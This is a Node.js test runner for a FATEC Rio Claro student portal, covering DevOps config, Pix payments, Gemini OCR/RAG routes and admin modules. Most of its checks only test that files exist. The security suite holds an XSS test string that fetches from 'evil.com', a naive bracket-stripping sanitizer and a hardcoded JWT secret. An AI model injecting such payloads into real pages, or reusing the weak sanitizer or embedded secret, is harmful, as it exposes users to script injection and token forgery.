// ====================================================================
// ESTEIRA UNIFICADA DE TESTES AUTOMATIZADOS (QA PIPELINE RUNNER)
// Responsável: Guilherme (DevOps, IA & QA) e Cesar (Backend & BD)
// Uso: npm test (ou node scripts/run_all_tests.js)
// ====================================================================

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

async function runFullQAPipeline() {
  console.log('===================================================================');
  console.log('🚀 ESTEIRA DE TESTES AUTOMATIZADOS (QA, DEVOPS, SEGURANÇA & IA)');
  console.log('Projeto: Portal Integrado FATEC Rio Claro | Sprints 1, 2 & 3');
  console.log('===================================================================\n');

  let totalPassed = 0;
  let totalFailed = 0;

  function assert(condition, suite, testName) {
    if (condition) {
      console.log(`  ✓ [${suite}] ${testName}`);
      totalPassed++;
    } else {
      console.error(`  ✗ [${suite}] FALHA: ${testName}`);
      totalFailed++;
    }
  }

  const rootDir = path.join(__dirname, '..');

  // ------------------------------------------------------------------
  // SUÍTE 1: INFRAESTRUTURA DEVOPS (VERCEL, SUPABASE & CI/CD)
  // ------------------------------------------------------------------
  console.log('📦 [SUÍTE 1/7] Validando Infraestrutura DevOps (Vercel, Supabase & CI/CD)...');
  const envExamplePath = path.join(rootDir, '.env.example');
  const vercelJsonPath = path.join(rootDir, 'vercel.json');
  const ciWorkflowPath = path.join(rootDir, '.github', 'workflows', 'ci-cd.yml');
  const schemaSqlPath = path.join(rootDir, 'database', 'schema.sql');

  assert(fs.existsSync(envExamplePath), 'DevOps', 'Arquivo .env.example presente para padronização de variáveis');
  const envExample = fs.readFileSync(envExamplePath, 'utf8');
  assert(
    envExample.includes('DATABASE_URL') &&
      envExample.includes('NEXT_PUBLIC_SUPABASE_URL') &&
      envExample.includes('GEMINI_API_KEY') &&
      envExample.includes('JWT_SECRET'),
    'DevOps',
    'Variáveis obrigatórias (Supabase, Vercel, JWT e Gemini SDK) mapeadas em .env.example'
  );

  assert(fs.existsSync(vercelJsonPath), 'DevOps', 'Configuração de deploy vercel.json presente');
  const vercelConfig = JSON.parse(fs.readFileSync(vercelJsonPath, 'utf8'));
  assert(
    Array.isArray(vercelConfig.regions) && vercelConfig.regions.includes('gru1'),
    'DevOps',
    'Região Serverless Vercel configurada para gru1 (São Paulo - Baixa Latência)'
  );

  assert(fs.existsSync(ciWorkflowPath), 'DevOps', 'Workflow GitHub Actions (.github/workflows/ci-cd.yml) configurado');
  assert(fs.existsSync(schemaSqlPath), 'DevOps', 'DDL PostgreSQL/Supabase (database/schema.sql) íntegro');

  // ------------------------------------------------------------------
  // SUÍTE 2: SEGURANÇA OWASP, AUTENTICAÇÃO & RATE LIMITING
  // ------------------------------------------------------------------
  console.log('\n🔐 [SUÍTE 2/7] Testando Segurança OWASP, Validação de Senha e Sanitização...');
  function validatePassword(pw) {
    return (
      typeof pw === 'string' &&
      pw.length >= 8 &&
      /[A-Z]/.test(pw) &&
      /[a-z]/.test(pw) &&
      /[0-9]/.test(pw) &&
      /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(pw)
    );
  }
  assert(validatePassword('Fatec@2026'), 'Security', 'Aprova senha forte em conformidade com a política OWASP');
  assert(!validatePassword('senhafraca'), 'Security', 'Bloqueia senha sem letra maiúscula, número e símbolo');

  const xssAttempt = '<script>fetch("http://evil.com")</script>Aluno FATEC';
  const sanitized = xssAttempt.trim().replace(/[<>]/g, '').slice(0, 1000);
  assert(!sanitized.includes('<script>'), 'Security', 'Sanitização neutraliza vetores XSS (<script>)');

  const jwtHeader = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
  const jwtPayload = Buffer.from(
    JSON.stringify({ sub: 'a0000000-0000-0000-0000-000000000003', role: 'CA_MEMBRO', course: 'IA' })
  ).toString('base64url');
  const signature = crypto
    .createHmac('sha256', 'fatec_rio_claro_super_secure_jwt_secret_key_2026')
    .update(`${jwtHeader}.${jwtPayload}`)
    .digest('base64url');
  const token = `${jwtHeader}.${jwtPayload}.${signature}`;
  assert(token.split('.').length === 3, 'Security', 'Emissão e estrutura criptográfica de token JWT HS256 validada');

  // ------------------------------------------------------------------
  // SUÍTE 3: INTELIGÊNCIA ARTIFICIAL (PIPELINE OCR VISÃO PIX & MOTOR RAG)
  // ------------------------------------------------------------------
  console.log('\n🤖 [SUÍTE 3/7] Testando Pipeline OCR/Visão Computacional Pix e Motor de IA RAG...');
  const geminiLibPath = path.join(rootDir, 'src', 'lib', 'gemini.ts');
  const geminiRoutePath = path.join(rootDir, 'src', 'app', 'api', 'ai', 'status', 'route.ts');
  const ragRoutePath = path.join(rootDir, 'src', 'app', 'api', 'ai', 'rag', 'route.ts');
  assert(fs.existsSync(geminiLibPath), 'Gemini-AI', 'Módulo src/lib/gemini.ts implementado');
  assert(fs.existsSync(geminiRoutePath), 'Gemini-AI', 'Endpoint REST /api/ai/status implementado');
  assert(fs.existsSync(ragRoutePath), 'Gemini-RAG', 'Endpoint REST /api/ai/rag implementado para consultas baseadas nos PDFs');

  const geminiLibSource = fs.readFileSync(geminiLibPath, 'utf8');
  assert(
    geminiLibSource.includes('analyzePixReceiptPipeline') && geminiLibSource.includes('GEMINI_VISION_MULTIMODAL'),
    'Gemini-Vision',
    'Pipeline de OCR e Visão Computacional Multimodal (analyzePixReceiptPipeline) configurado'
  );
  assert(
    geminiLibSource.includes('queryAcademicRAG') && geminiLibSource.includes('buildAcademicKnowledgeCorpus'),
    'Gemini-RAG',
    'Motor de IA RAG (Retrieval-Augmented Generation) com citações de PDFs implementado'
  );

  function evaluateReceipt(text, expected) {
    const brlMatch = text.match(/R\$\s*(\d+[.,]\d{2})/i);
    const extracted = brlMatch ? parseFloat(brlMatch[1].replace(',', '.')) : null;
    const matches = extracted !== null && Math.abs(extracted - expected) < 0.01;
    return {
      extracted,
      matches,
      status: matches ? 'APROVADO_IA' : extracted !== null ? 'DIVERGENTE' : 'REQUER_REVISAO_CA',
    };
  }
  assert(
    evaluateReceipt('COMPROVANTE PIX R$ 6,00 - Doritos Cantina FATEC', 6.0).status === 'APROVADO_IA',
    'Gemini-AI',
    'Motor OCR aprova automaticamente comprovante Pix com valor exato'
  );
  assert(
    evaluateReceipt('COMPROVANTE PIX R$ 4,50 - Cantina FATEC', 6.0).status === 'DIVERGENTE',
    'Gemini-AI',
    'Motor OCR bloqueia comprovante com valor divergente do pedido'
  );

  // ------------------------------------------------------------------
  // SUÍTE 4: MÓDULOS CENTRAIS DA SPRINT 2 (CANTINA, PIX, EXTRATO & TCC)
  // ------------------------------------------------------------------
  console.log('\n💳 [SUÍTE 4/7] Validando Módulos Centrais Sprint 2 (Pix Dinâmico, Catálogo, Checkout, Histórico & TCC)...');
  function calculateCRC16(data) {
    let crc = 0xffff;
    for (let i = 0; i < data.length; i++) {
      crc ^= data.charCodeAt(i) << 8;
      for (let j = 0; j < 8; j++) {
        if ((crc & 0x8000) !== 0) {
          crc = ((crc << 1) ^ 0x1021) & 0xffff;
        } else {
          crc = (crc << 1) & 0xffff;
        }
      }
    }
    return crc.toString(16).toUpperCase().padStart(4, '0');
  }
  assert(calculateCRC16('123456789') === '29B1', 'Sprint2-Pix', 'Cálculo de CRC-16/CCITT-FALSE compatível com padrão BACEN');

  const pixLib = path.join(rootDir, 'src', 'lib', 'pix.ts');
  const pixGenerate = path.join(rootDir, 'src', 'app', 'api', 'pix', 'generate', 'route.ts');
  const pixValidate = path.join(rootDir, 'src', 'app', 'api', 'pix', 'validate', 'route.ts');
  assert(fs.existsSync(pixLib), 'Sprint2-Pix', 'Serviço de geração Pix EMV (src/lib/pix.ts) presente');
  assert(fs.existsSync(pixGenerate), 'Sprint2-Pix', 'API de geração Pix dinâmica (/api/pix/generate) presente');
  assert(fs.existsSync(pixValidate), 'Sprint2-Pix', 'API de validação Pix (/api/pix/validate) presente');

  const canteenProdRoute = path.join(rootDir, 'src', 'app', 'api', 'canteen', 'products', 'route.ts');
  const canteenStockRoute = path.join(rootDir, 'src', 'app', 'api', 'canteen', 'products', '[id]', 'stock', 'route.ts');
  assert(fs.existsSync(canteenProdRoute), 'Sprint2-Canteen', 'CRUD de catálogo (/api/canteen/products) presente');
  assert(fs.existsSync(canteenStockRoute), 'Sprint2-Canteen', 'Controle de estoque (/api/canteen/products/[id]/stock) presente');

  const checkoutRoute = path.join(rootDir, 'src', 'app', 'api', 'canteen', 'checkout', 'route.ts');
  const historyRoute = path.join(rootDir, 'src', 'app', 'api', 'canteen', 'history', 'route.ts');
  const txRoute = path.join(rootDir, 'src', 'app', 'api', 'canteen', 'transactions', 'route.ts');
  const proofRoute = path.join(rootDir, 'src', 'app', 'api', 'canteen', 'transactions', '[id]', 'proof', 'route.ts');
  assert(fs.existsSync(checkoutRoute), 'Sprint2-Orders', 'Checkout com Pix EMV (/api/canteen/checkout) presente');
  assert(fs.existsSync(historyRoute), 'Sprint2-Orders', 'Extrato de compras do aluno (/api/canteen/history) presente');
  assert(fs.existsSync(txRoute), 'Sprint2-Orders', 'Histórico e auditoria de compras (/api/canteen/transactions) presente');

  const proofSource = fs.readFileSync(proofRoute, 'utf8');
  assert(
    proofSource.includes('analyzePixReceiptPipeline') && proofSource.includes("ocrResult.status === 'APROVADO_IA'"),
    'Sprint2-OCR-Proof',
    'Rota /api/canteen/transactions/[id]/proof integrada ao pipeline OCR/Visão com liquidação automática PAGO'
  );

  const materialsRoute = path.join(rootDir, 'src', 'app', 'api', 'materials', 'route.ts');
  const materialsUpload = path.join(rootDir, 'src', 'app', 'api', 'materials', 'upload', 'route.ts');
  const announcementsRoute = path.join(rootDir, 'src', 'app', 'api', 'announcements', 'route.ts');
  assert(fs.existsSync(materialsRoute), 'Sprint2-Materials', 'Repositório acadêmico e TCC (/api/materials) presente');
  assert(fs.existsSync(materialsUpload), 'Sprint2-Materials', 'Endpoint de upload de materiais (/api/materials/upload) presente');
  assert(fs.existsSync(announcementsRoute), 'Sprint2-Materials', 'Mural de comunicados (/api/announcements) presente');

  // ------------------------------------------------------------------
  // SUÍTE 5: TESTES DE INTEGRAÇÃO DO CHECKOUT E USABILIDADE MOBILE (GUILHERME)
  // ------------------------------------------------------------------
  console.log('\n📱 [SUÍTE 5/7] Validando Testes de Integração de Checkout da Cantina e Usabilidade Mobile...');
  const checkoutIntegrationTestPath = path.join(rootDir, 'tests', 'unit', 'canteen_checkout_integration.test.ts');
  const mobileUsabilityDocPath = path.join(rootDir, 'docs', 'relatorio_usabilidade_mobile_e_qa_guilherme.md');
  const e2eSpecPath = path.join(rootDir, 'tests', 'e2e', 'portal.spec.ts');

  assert(
    fs.existsSync(checkoutIntegrationTestPath),
    'QA-Integration',
    'Suíte de testes de integração do fluxo de checkout e compra na cantina (tests/unit/canteen_checkout_integration.test.ts) presente'
  );
  assert(
    fs.existsSync(mobileUsabilityDocPath),
    'QA-Mobile-UX',
    'Relatório de testes preliminares de usabilidade mobile com alunos do 1º e 2º semestres presente em docs/'
  );
  const e2eContent = fs.readFileSync(e2eSpecPath, 'utf8');
  assert(
    e2eContent.includes('setViewportSize({ width: 390, height: 844 })') && e2eContent.includes('/api/ai/rag'),
    'QA-Mobile-E2E',
    'Cenários E2E mobile (390x844) e validação do motor RAG para semestres iniciais configurados no Playwright'
  );

  // ------------------------------------------------------------------
  // SUÍTE 6: ARQUITETURA FRONTEND, ROTAS E DOCUMENTAÇÃO DE REQUISITOS
  // ------------------------------------------------------------------
  console.log('\n🧭 [SUÍTE 6/7] Verificando Rotas da Aplicação, Configs Vitest/Playwright e Documentação...');
  const requiredRoutes = [
    'src/app/page.tsx',
    'src/app/login/page.tsx',
    'src/app/cadastro/page.tsx',
    'src/app/cantina/page.tsx',
    'src/app/avisos/page.tsx',
    'src/app/repositorio/page.tsx',
    'src/app/vitrine/page.tsx',
    'src/app/historico/page.tsx',
    'src/app/api/health/route.ts',
    'src/app/api/ai/status/route.ts',
    'src/app/api/ai/rag/route.ts',
  ];

  const allRoutesExist = requiredRoutes.every((rel) => fs.existsSync(path.join(rootDir, rel)));
  assert(allRoutesExist, 'QA-Routes', 'Todas as 11 rotas críticas de Frontend e API (incluindo /api/ai/rag) existem e estão íntegras');

  assert(
    fs.existsSync(path.join(rootDir, 'vitest.config.ts')) &&
      fs.existsSync(path.join(rootDir, 'playwright.config.ts')),
    'QA-Config',
    'Arquivos de configuração do Vitest (Unit/Integration) e Playwright (E2E) definidos'
  );

  assert(
    fs.existsSync(path.join(rootDir, 'tests', 'unit', 'security.test.ts')) &&
      fs.existsSync(path.join(rootDir, 'tests', 'unit', 'canteen_pix.test.ts')) &&
      fs.existsSync(path.join(rootDir, 'tests', 'unit', 'canteen_checkout_integration.test.ts')) &&
      fs.existsSync(path.join(rootDir, 'tests', 'unit', 'materials.test.ts')),
    'QA-Suites',
    'Suítes de testes unitários e de integração estruturadas em /tests/unit'
  );

  // ------------------------------------------------------------------
  // SUÍTE 7: SPRINT 3 - BACKEND ANALYTICS, SEGURANÇA E RELATÓRIOS 200H
  // ------------------------------------------------------------------
  console.log('\n📈 [SUÍTE 7/8] Validando Módulos Analíticos, Otimizações de Banco e Relatórios de Estágio...');
  const sprint3Analytics = [
    'src/app/api/ca/analytics/financial/route.ts',
    'src/app/api/ca/analytics/products/route.ts',
    'src/app/api/ca/analytics/audit/route.ts',
    'src/app/api/ca/analytics/export/route.ts',
  ];
  const allAnalyticsRoutesExist = sprint3Analytics.every((rel) => fs.existsSync(path.join(rootDir, rel)));
  assert(allAnalyticsRoutesExist, 'Sprint3-Analytics', 'Rotas analíticas do Centro Acadêmico (Financeiro, Produtos, Auditoria, CSV) criadas');

  const optimizationSqlPath = path.join(rootDir, 'database', 'optimization_indexes.sql');
  assert(fs.existsSync(optimizationSqlPath), 'Sprint3-DB', 'Script de índices avançados database/optimization_indexes.sql presente');

  const explainDocPath = path.join(rootDir, 'docs', 'analise_planos_execucao_explain.md');
  assert(fs.existsSync(explainDocPath), 'Sprint3-DB', 'Relatório de planos de execução EXPLAIN ANALYZE presente em docs/');

  const manualDocPath = path.join(rootDir, 'docs', 'manual_tecnico_backend_db.md');
  assert(fs.existsSync(manualDocPath), 'Sprint3-Docs', 'Manual Técnico de Backend & Banco de Dados completo em docs/');

  const relatorioSprint3Cesar = path.join(rootDir, 'docs', 'relatorio_estagio_sprint3_cesar.md');
  const relatorioSprint2Gui = path.join(rootDir, 'docs', 'relatorio_estagio_sprint2_guilherme.md');
  const relatorioSprint3Gui = path.join(rootDir, 'docs', 'relatorio_estagio_sprint3_guilherme.md');
  assert(
    fs.existsSync(relatorioSprint3Cesar) && fs.existsSync(relatorioSprint2Gui) && fs.existsSync(relatorioSprint3Gui),
    'Sprint3-Docs',
    'Relatórios de Estágio Supervisionado (Sprints 1, 2 e 3 - 200h totais) homologados'
  );

  // ------------------------------------------------------------------
  // SUÍTE 8: GESTÃO ADMINISTRATIVA DE USUÁRIOS & CONTAS DISCENTES
  // ------------------------------------------------------------------
  console.log('\n👥 [SUÍTE 8/8] Validando Módulo de Gestão Administrativa de Usuários & Contas...');
  const adminPagePath = path.join(rootDir, 'src', 'app', 'admin', 'usuarios', 'page.tsx');
  const adminApiUsers = path.join(rootDir, 'src', 'app', 'api', 'admin', 'users', 'route.ts');
  const adminApiUserId = path.join(rootDir, 'src', 'app', 'api', 'admin', 'users', '[id]', 'route.ts');
  const adminApiReset = path.join(rootDir, 'src', 'app', 'api', 'admin', 'users', '[id]', 'reset-password', 'route.ts');

  assert(fs.existsSync(adminPagePath), 'Admin-UI', 'Tela web de Gestão de Usuários (/admin/usuarios) implementada');
  assert(fs.existsSync(adminApiUsers), 'Admin-API', 'Endpoint administrativo /api/admin/users implementado');
  assert(fs.existsSync(adminApiUserId), 'Admin-API', 'Endpoint de atualização/exclusão /api/admin/users/[id] implementado');
  assert(fs.existsSync(adminApiReset), 'Admin-API', 'Endpoint de redefinição de senha /api/admin/users/[id]/reset-password implementado');

  const dbCode = fs.readFileSync(path.join(rootDir, 'src', 'lib', 'db.ts'), 'utf8');
  assert(dbCode.includes('deleteUser:'), 'Admin-DB', 'Método seguro de exclusão permanente (deleteUser) ativo na camada db');
  assert(dbCode.includes('updateRole:'), 'Admin-DB', 'Método de alteração de cargo (updateRole) ativo na camada db');
  assert(dbCode.includes('updateStatus:'), 'Admin-DB', 'Método de ativação/inativação (updateStatus) ativo na camada db');

  console.log('\n===================================================================');
  console.log(`📊 RESUMO DA ESTEIRA DE QA: ${totalPassed} testes aprovados | ${totalFailed} falhas`);
  if (totalFailed === 0) {
    console.log('✅ STATUS DA BUILD: APROVADA (100% GREEN) — PRONTA PARA DEPLOY VERCEL!');
  } else {
    console.error('❌ STATUS DA BUILD: REPROVADA — VERIFIQUE OS ERROS ACIMA.');
    process.exitCode = 1;
  }
  console.log('===================================================================\n');
}

runFullQAPipeline().catch((err) => {
  console.error(err);
  process.exit(1);
});
